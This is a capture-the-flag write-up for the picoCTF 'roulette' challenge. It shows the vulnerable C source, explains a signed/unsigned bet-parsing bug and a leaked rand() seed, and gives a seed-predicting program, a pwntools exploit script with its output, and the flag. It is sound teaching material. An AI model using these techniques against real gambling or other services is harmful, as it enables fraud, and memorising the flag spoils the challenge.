# roulette
General Skills, 350 points

## Description:
> This Online Roulette Service is in Beta. Can you find a way to win $1,000,000,000 and get the flag?

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <limits.h>

#define MAX_NUM_LEN 12
#define HOTSTREAK 3
#define MAX_WINS 16
#define ONE_BILLION 1000000000
#define ROULETTE_SIZE 36
#define ROULETTE_SPINS 128
#define ROULETTE_SLOWS 16
#define NUM_WIN_MSGS 10
#define NUM_LOSE_MSGS 5

long cash = 0;
long wins = 0;

int is_digit(char c) {
    return '0' <= c && c <= '9';
}

long get_long() {
    printf("> ");
    uint64_t l = 0;
    char c = 0;
    while(!is_digit(c))
      c = getchar();
    while(is_digit(c)) {
      if(l >= LONG_MAX) {
	l = LONG_MAX;
	break;
      }
      l *= 10;
      l += c - '0';
      c = getchar();
    }
    while(c != '\n')
      c = getchar();
    return l;
}

long get_rand() {
  long seed;
  FILE *f = fopen("/dev/urandom", "r");
  fread(&seed, sizeof(seed), 1, f);
  fclose(f);
  seed = seed % 5000;
  if (seed < 0) seed = seed * -1;
  srand(seed);
  return seed;
}

long get_bet() {
  while(1) {
    puts("How much will you wager?");
    printf("Current Balance: $%lu \t Current Wins: %lu\n", cash, wins); 
    long bet = get_long(); 
    if(bet <= cash) {
      return bet;
    } else {
      puts("You can't bet more than you have!");
    }
  }
}

long get_choice() {
  while (1) {
    printf("Choose a number (1-%d)\n", ROULETTE_SIZE);
    long choice = get_long();
    if (1 <= choice && choice <= ROULETTE_SIZE) {
      return choice;
    } else {
      puts("Please enter a valid choice.");
    }
  }
}

int print_flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Failed to open the flag file\n");
    return -1;
  }
  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}

const char *win_msgs[NUM_WIN_MSGS] = {
  "Wow.. Nice One!",
  "You chose correct!",
  "Winner!",
  "Wow, you won!",
  "Alright, now you're cooking!",
  "Darn.. Here you go",
  "Darn, you got it right.",
  "You.. win.. this round...",
  "Congrats!",
  "You're not cheating are you?",
};

const char *lose_msgs1[NUM_LOSE_MSGS] = {
  "WRONG",
  "Nice try..",
  "YOU LOSE",
  "Not this time..",
  "Better luck next time..."
};

const char *lose_msgs2[NUM_LOSE_MSGS] = {
  "Just give up!",
  "It's over for you.",
  "Stop wasting your time.",
  "You're never gonna win",
  "If you keep it up, maybe you'll get the flag in 100000000000 years"
};

void spin_roulette(long spin) {
  int n;
  puts("");
  printf("Roulette  :  ");
  int i, j;
  int s = 12500;
  for (i = 0; i < ROULETTE_SPINS; i++) {
    n = printf("%d", (i%ROULETTE_SIZE)+1);
    usleep(s);
    for (j = 0; j < n; j++) {
      printf("\b \b");
    }
  }
  for (i = ROULETTE_SPINS; i < (ROULETTE_SPINS+ROULETTE_SIZE); i++) {
    n = printf("%d", (i%ROULETTE_SIZE)+1);
    if (((i%ROULETTE_SIZE)+1) == spin) {
      for (j = 0; j < n; j++) {
	printf("\b \b");
      }
      break;
    }
    usleep(s);
    for (j = 0; j < n; j++) {
      printf("\b \b");
    }
  }
  for (int k = 0; k < ROULETTE_SIZE; k++) {
    n = printf("%d", ((i+k)%ROULETTE_SIZE)+1);
    s = 1.1*s;
    usleep(s);
    for (j = 0; j < n; j++) {
      printf("\b \b");
    }
  }
  printf("%ld", spin);
  usleep(s);
  puts("");
  puts("");
}

void play_roulette(long choice, long bet) {
  
  printf("Spinning the Roulette for a chance to win $%lu!\n", 2*bet);
  long spin = (rand() % ROULETTE_SIZE)+1;

  spin_roulette(spin);
  
  if (spin == choice) {
    cash += 2*bet;
    puts(win_msgs[rand()%NUM_WIN_MSGS]);
    wins += 1;
  }
  else {
    puts(lose_msgs1[rand()%NUM_LOSE_MSGS]);
    puts(lose_msgs2[rand()%NUM_LOSE_MSGS]);
  }
  puts("");
}

int main(int argc, char *argv[]) {
  setvbuf(stdout, NULL, _IONBF, 0);

  cash = get_rand();
  
  puts("Welcome to ONLINE ROULETTE!");
  printf("Here, have $%ld to start on the house! You'll lose it all anyways >:)\n", cash);
  puts("");
  
  long bet;
  long choice;
  while(cash > 0) {
      bet = get_bet();
      cash -= bet;
      choice = get_choice();
      puts("");
      
      play_roulette(choice, bet);
      
      if (wins >= MAX_WINS) {
	printf("Wow you won %lu times? Looks like its time for you cash you out.\n", wins);
	printf("Congrats you made $%lu. See you next time!\n", cash);
	exit(-1);
      }
      
      if(cash > ONE_BILLION) {
	printf("*** Current Balance: $%lu ***\n", cash);
	if (wins >= HOTSTREAK) {
	  puts("Wow, I can't believe you did it.. You deserve this flag!");
	  print_flag();
	  exit(0);
	}
	else {
	  puts("Wait a second... You're not even on a hotstreak! Get out of here cheater!");
	  exit(-1);
	}
	}
  }
  puts("Haha, lost all the money I gave you already? See ya later!");
  return 0;
}
```

## Solution:

In this Roulette game, we need to make more than `ONE_BILLION` dollars, winning at least `HOTSTREAK` times, in order to get the flag.

A typical game is similar to the following:
```
root@kali:/media/sf_CTFs/pico/roulette# ./roulette
Welcome to ONLINE ROULETTE!
Here, have $2436 to start on the house! You'll lose it all anyways >:)

How much will you wager?
Current Balance: $2436   Current Wins: 0
> 42
Choose a number (1-36)
> 24

Spinning the Roulette for a chance to win $84!

Roulette  :  9

Not this time..
It's over for you.

How much will you wager?
Current Balance: $2394   Current Wins: 0
>
```

We start with a random amount of cash. We place a bet on one of the number, and if we get it right we double our bet. Given the odds, though, most chances are that we'd lose. Unless we cheat, that is.

First, let's check what happens if we try to bet on more than we have:
```
How much will you wager?
Current Balance: $9      Current Wins: 0
> 10
You can't bet more than you have!
How much will you wager?
Current Balance: $9      Current Wins: 0
```

The program won't let us. This is enforced by the following logic:
```c
long get_long() {
    printf("> ");
    uint64_t l = 0;
    char c = 0;
    while(!is_digit(c))
      c = getchar();
    while(is_digit(c)) {
      if(l >= LONG_MAX) {
	l = LONG_MAX;
	break;
      }
      l *= 10;
      l += c - '0';
      c = getchar();
    }
    while(c != '\n')
      c = getchar();
    return l;
}

long get_bet() {
  while(1) {
    puts("How much will you wager?");
    printf("Current Balance: $%lu \t Current Wins: %lu\n", cash, wins); 
    long bet = get_long(); 
    if(bet <= cash) {
      return bet;
    } else {
      puts("You can't bet more than you have!");
    }
  }
}
```

Notice how `get_long` uses uint64_t, while get_bet uses `long`. 
So this comparison is unsigned:
```c
      if(l >= LONG_MAX) {
        l = LONG_MAX;
	      break;
      }
```

Which means that we aren't allowed to bet on LONG_MAX, but we are allowed to be on LONG_MAX + 1 (which will be interpreted as 0) or higher:
```
Current Balance: $9      Current Wins: 0
> 2147483647
You can't bet more than you have!
How much will you wager?
Current Balance: $9      Current Wins: 0
> 2147483648
Choose a number (1-36)
> 1

Spinning the Roulette for a chance to win $0!
```

What happens if we bet on LONG_MAX + 100000000?
```
Current Balance: $1245   Current Wins: 0
> 2247483647
Choose a number (1-36)
> 1

Spinning the Roulette for a chance to win $199999998!

Roulette  :  31

WRONG
Stop wasting your time.

*** Current Balance: $2047484894 ***
Wait a second... You're not even on a hotstreak! Get out of here cheater!
```

`get_bet` returns with 2247483647 interpreted as signed, which is -2047483649 as a signed long:
```
root@kali:/media/sf_CTFs/pico/roulette# python
Python 2.7.15 (default, May  1 2018, 05:55:50)
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import numpy
>>> numpy.uint32(2247483647)
2247483647
>>> numpy.int32(2247483647)
-2047483649
>>>
```

The bet is subtracted from the cash, but since the bet is negative, the cash grows:
```c
      bet = get_bet();
      cash -= bet; // => cash -= -2047483649 => cash += 2047483649 = 1245 + 2047483649 = 2047484894
```

As long as we don't guess right, we are richer. However, we have to be on a hotstreak to win, otherwise the program identifies us (correctly) as cheaters.

To correctly predict the upcoming number, we'll have to find another bug.

The chosen number is selected by calling `rand`:
```c
long spin = (rand() % ROULETTE_SIZE)+1;
```

However, `rand` is only pseudo-random. Given the same seed, it will produce the same outcome. The seed is selected by calling `/dev/urandom`:
```c
long get_rand() {
  long seed;
  FILE *f = fopen("/dev/urandom", "r");
  fread(&seed, sizeof(seed), 1, f);
  fclose(f);
  seed = seed % 5000;
  if (seed < 0) seed = seed * -1;
  srand(seed);
  return seed;
}
```

Which means that we can't easily predict it. Fortunately, it is leaked:
```c
  cash = get_rand();
  
  puts("Welcome to ONLINE ROULETTE!");
  printf("Here, have $%ld to start on the house! You'll lose it all anyways >:)\n", cash);
```

So, given the amount of cash (a.k.a. random seed), we can predict all the upcoming random numbers, using the following C program:
```c
#include <stdio.h>
#include <stdlib.h>

#define ROULETTE_SIZE (36)
#define NUM_RAND_NAMBERS (10)

int main (int argc, char* argv[]) {
   int i;

   srand(atoi(argv[1]));

   for( i = 0 ; i < NUM_RAND_NAMBERS ; i++ ) {
      printf("%d\n", (rand() % ROULETTE_SIZE) + 1);
   }
   
   return 0 ;
}
```

Compile it with `gcc rand_rol.c -o rand_rol` and we get the ability to predict 10 random numbers, given a seed.
```console
root@kali:/media/sf_CTFs/pico/roulette# ./rand_rol 1245
31
21
9
26
32
31
5
17
7
1
```

Now, we run the program again, and use the cash amount as a parameter for `rand_rol` in order to get the next 10 random numbers. We just need to win 3 rounds, but each round "wastes" 2 random numbers: One for the chosen number, and one more for `puts(win_msgs[rand()%NUM_WIN_MSGS])`.

We win 3 times, then bet for LONG_MAX + 100000000, and we're done.

The script:
```python
from pwn import *
import re

LONG_MAX = 0x7FFFFFFF

r = remote("2018shell3.picoctf.com", 48312)

r.recvline()
line = r.recvline()
print line
seed = re.search("\$(\d+)", line).group(1)
log.info("Seed: {}".format(seed))

rand_rol = process(["./rand_rol", str(seed)])
random_values = rand_rol.recvall()
random_arr = random_values.split("\n")

log.info("Random values: {}".format(random_arr))

def make_bet(amount, number):
    log.info("Making bet: Amount: {}, number: {}".format(amount, number))
    r.recvuntil("> ")
    r.sendline(str(amount))
    r.recvuntil("> ")
    r.sendline(str(number))
    for i in range(7):
        line = r.recvline().strip()
        if line != "":
            print line


for i in range(3):
    number = random_arr.pop(0)
    random_arr.pop(0)
    make_bet(1, number)

make_bet(LONG_MAX + 100000000, 1)
print r.recvall()
```

The output:
```console
root@kali:/media/sf_CTFs/pico/roulette# python exploit.py
[+] Opening connection to 2018shell3.picoctf.com on port 48312: Done
Here, have $2552 to start on the house! You'll lose it all anyways >:)

[*] Seed: 2552
[+] Starting local process './rand_rol': pid 2131
[+] Receiving all data: Done (28B)
[*] Process './rand_rol' stopped with exit code 0 (pid 2131)
[*] Random values: ['25', '5', '20', '12', '31', '35', '19', '1', '20', '13', '']
[*] Making bet: Amount: 1, number: 25
Spinning the Roulette for a chance to win $2!
Roulette  :  25
Darn, you got it right.
[*] Making bet: Amount: 1, number: 20
Spinning the Roulette for a chance to win $2!
Roulette  :  20
You chose correct!
[*] Making bet: Amount: 1, number: 31
Spinning the Roulette for a chance to win $2!
Roulette  :  31
Wow.. Nice One!
[*] Making bet: Amount: 2247483647, number: 1
Spinning the Roulette for a chance to win $199999998!
Roulette  :  19
WRONG
It's over for you.
[+] Receiving all data: Done (140B)
[*] Closed connection to 2018shell3.picoctf.com port 48312

*** Current Balance: $2047486204 ***
Wow, I can't believe you did it.. You deserve this flag!
picoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_8fb4d984}
```

The flag: picoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_8fb4d984}
